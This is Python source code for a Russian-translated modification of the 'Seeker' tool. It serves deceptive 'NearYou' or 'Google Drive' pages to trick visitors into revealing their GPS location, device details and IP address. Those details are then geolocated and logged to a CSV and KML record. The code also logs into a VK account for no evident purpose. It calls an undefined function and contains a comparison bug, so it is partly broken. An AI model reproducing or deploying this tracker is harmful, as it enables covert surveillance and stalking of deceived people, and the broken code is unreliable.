#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import csv
import sys
import time
import json
import argparse
import requests
import subprocess as subp
import vk_api

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

parser = argparse.ArgumentParser()
parser.add_argument('-s', '--subdomain', help='Provide Subdomain for Serveo URL ( Необязательно )')
parser.add_argument('-k', '--kml', help='Provide KML Filename ( Необязательно )')
parser.add_argument('-vkl', '--vklogin', help='Ваш логин ВК ( Необязательно )')
parser.add_argument('-vkp', '--vkpassword', help='Ваш пароль ВК ( Необязательно )')
args = parser.parse_args()
subdom = args.subdomain
kml_fname = args.kml
vk_login = args.vklogin
vk_password = args.vkpassword

row = []
site = ''
info = ''
result = ''
version = '1.2.1'

vk = vk_api.VkApi(vk_login, vk_password)
vk.auth()
api = vk.get_api()

def banner():
	os.system('clear')
	print (G +
	r'''
                        __
  ______  ____   ____  |  | __  ____ _______
 /  ___/_/ __ \_/ __ \ |  |/ /_/ __ \\_  __ \
 \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/
/____  > \___  >\___  >|__|_ \ \___  >|__|
	 \/      \/     \/      \/     \/        ''' + W)
	print('\n' + G + '[>]' + C + ' Создатель: ' + W + 'thewhiteh4t')
	print('\n' + G + '[>]' + C + ' Перевод и модификация: ' + W + 'Phelifar')
	print(G + '[>]' + C + ' Версия: ' + W + version + '\n')
	print(api.account.getInfo())

def ver_check():
	print(G + '[+]' + C + ' Проверка обновлений.....', end='')
	ver_url = 'https://raw.githubusercontent.com/Phelifaar/seeker/master/version.txt'
	ver_rqst = requests.get(ver_url)
	ver_sc = ver_rqst.status_code
	if ver_sc == 200:
		github_ver = ver_rqst.text
		github_ver = github_ver.strip()

		if version == github_ver:
			print(C + '[' + G + ' Новейший ' + C +']' + '\n')
		else:
			print(C + '[' + G + ' Available : {} '.format(github_ver) + C + ']' + '\n')
	else:
		print(C + '[' + R + ' Статус : {} '.format(ver_sc) + C + ']' + '\n')

print(G + '[+]' + C + ' Запустите NGROK...' + W + '\n')

def template_select():
	global site, info, result
	print(G + '[+]' + C + ' Выберите вид Seeker : ' + W + '\n')
	print(G + '[1]' + C + ' NearYou' + W)
	print(G + '[2]' + C + ' Google Drive' + W)
	selected = int(input(G + '[>] ' + W))
	
	if selected == 1:
		site = 'nearyou'
		print('\n' + G + '[+]' + C + ' Загрузка NearYou...' + W)
	elif selected == 2:
		site = 'gdrive'
		print('\n' + G + '[+]' + C + ' Загрузка Google Drive...' + W)
		redirect = input(G + '[+]' + C + ' Впишите URL файла на GDrive  : ' + W)
		with open('template/gdrive/js/location_temp.js', 'r') as js:
			reader = js.read()
			update = reader.replace('REDIRECT_URL', redirect)
		with open('template/gdrive/js/location.js', 'w') as js_update:
			js_update.write(update)
	else:
		print(R + '[-]' + C + ' Неверный ввод, принимаются только цифры' + W + '\n')

	info = 'template/{}/php/info.txt'.format(site)
	result = 'template/{}/php/result.txt'.format(site)

def server():
	global site
	print('\n' + G + '[+]' + C + ' Запуск PHP Сервера......' + W, end='')
	with open('logs/php.log', 'w') as phplog:
		subp.Popen(['php', '-S', '0.0.0.0:8080', '-t', 'template/{}/'.format(site)], stdout=phplog, stderr=phplog)
		time.sleep(3)
	try:
		php_rqst = requests.get('http://0.0.0.0:8080/index.html')
		php_sc = php_rqst.status_code
		if php_sc == 200:
			print(C + '[' + G + ' Успех ' + C + ']' + W)
		else:
			print(C + '[' + R + 'Статус : {}'.format(php_sc) + C + ']' + W)
	except requests.ConnectionError:
		print(C + '[' + R + ' Неудача ' + C + ']' + W)
		Quit()

def wait():
	printed = False
	while True:
		time.sleep(2)
		size = os.path.getsize(result)
		if size == 0 and printed == False:
			print('\n' + G + '[+]' + C + ' Ожидаются действия пользователя...' + W + '\n')
			printed = True
		if size > 0:
			main()

def main():
	global info, result, row, var_lat, var_lon
	try:
		row = []
		with open (info, 'r') as file2:
			file2 = file2.read()
			json3 = json.loads(file2)
			for value in json3['dev']:

				var_os = value['os']
				var_platform = value['platform']
				try:
					var_cores = value['cores']
				except TypeError:
					var_cores = 'Нет данных'
				var_ram = value['ram']
				var_vendor = value['vendor']
				var_render = value['render']
				var_res = value['wd'] + 'x' + value['ht']
				var_browser = value['browser']
				var_ip = value['ip']

				row.append(var_os)
				row.append(var_platform) 
				row.append(var_cores) 
				row.append(var_ram) 
				row.append(var_vendor)
				row.append(var_render)
				row.append(var_res)
				row.append(var_browser)
				row.append(var_ip)

				print(G + '[+]' + C + ' Информация устройства : ' + W + '\n')
				print(G + '[+]' + C + ' ОС         : ' + W + var_os)
				print(G + '[+]' + C + ' Платформа  : ' + W + var_platform)
				print(G + '[+]' + C + ' Кол-го ядер: ' + W + var_cores)
				print(G + '[+]' + C + ' RAM        : ' + W + var_ram)
				print(G + '[+]' + C + ' GPU        : ' + W + var_vendor+ "\|/" + W + var_render)
				print(G + '[+]' + C + ' Разрешение : ' + W + var_res)
				print(G + '[+]' + C + ' Браузер    : ' + W + var_browser)
				print(G + '[+]' + C + ' IP         : ' + W + var_ip)

				rqst = requests.get('http://free.ipwhois.io/json/{}'.format(var_ip))
				sc = rqst.status_code

				if sc == 200:
					data = rqst.text
					data = json.loads(data)
					var_country = str(data['country'])
					var_region = str(data['region'])
					var_city = str(data['city'])
					var_org = str(data['org'])
					var_isp = str(data['isp'])

					row.append(var_country)
					row.append(var_region)
					row.append(var_city)
					row.append(var_org)
					row.append(var_isp)

					print(G + '[+]' + C + ' Страна     : ' + W + var_country)
					print(G + '[+]' + C + ' Регион     : ' + W + var_region)
					print(G + '[+]' + C + ' Город      : ' + W + var_city)
					print(G + '[+]' + C + ' Org    : ' + W + var_org)
					print(G + '[+]' + C + ' Провайдер  : ' + W + var_isp)
	except ValueError:
		pass
	
	try:
		with open (result, 'r') as file:
			file = file.read()
			json2 = json.loads(file)
			for value in json2['info']:
				var_lat = value['lat'] + ' deg'
				var_lon = value['lon'] + ' deg'
				var_acc = value['acc'] + ' m'

				var_alt = value['alt']
				if var_alt == '':
					var_alt = 'Нет данных'
				else:
					var_alt == value['alt'] + ' m'
				
				var_dir = value['dir']
				if var_dir == '':
					var_dir = 'Нет данных'
				else:
					var_dir = value['dir'] + ' deg'
				
				var_spd = value['spd']
				if var_spd == '':
					var_spd = 'Нет данных'
				else:
					var_spd = value['spd'] + ' m/s'

				row.append(var_lat)
				row.append(var_lon)
				row.append(var_acc)
				row.append(var_alt)
				row.append(var_dir)
				row.append(var_spd)

				print ('\n' + G + '[+]' + C + ' Информация местоположения: ' + W + '\n')
				print (G + '[+]' + C + ' Широта      : ' + W + var_lat)
				print (G + '[+]' + C + ' Долгота     : ' + W + var_lon)
				print (G + '[+]' + C + ' Точность    : ' + W + var_acc)
				print (G + '[+]' + C + ' Высота      : ' + W + var_alt)
				print (G + '[+]' + C + ' Направление : ' + W + var_dir)
				print (G + '[+]' + C + ' Скорость    : ' + W + var_spd)
	except ValueError:
		error = file
		print ('\n' + R + '[-] ' + W + error)
		repeat()

	print ('\n' + G + '[+]' + C + ' Google Maps.................: ' + W + 'https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
	
	if kml_fname is not None:
		kmlout(var_lat, var_lon)

	csvout()
	repeat()

def kmlout(var_lat, var_lon):
	with open('template/sample.kml', 'r') as kml_sample:
		kml_sample_data = kml_sample.read()

	kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
	kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))

	with open('{}.kml'.format(kml_fname), 'w') as kml_gen:
		kml_gen.write(kml_sample_data)

	print(G + '[+]' + C + ' Генерация KML файла..........: ' + W + os.getcwd() + '/{}.kml'.format(kml_fname))

def csvout():
	global row
	with open('db/results.csv', 'a') as csvfile:
		writer = csv.writer(csvfile)
		writer.writerow(row)
	print(G + '[+]' + C + ' Добавлена новая запись в базу данных: ' + W + os.getcwd() + '/db/results.csv')

def clear():
	global result
	with open (result, 'w+'): pass
	with open (info, 'w+'): pass

def repeat():
	clear()
	wait()
	main()

def Quit():
	global result
	with open (result, 'w+'): pass
	os.system('pkill php')
	exit()

try:
	banner()
	ver_check()
	tunnel_select()
	template_select()
	server()
	wait()
	main()

except KeyboardInterrupt:
	Quit()
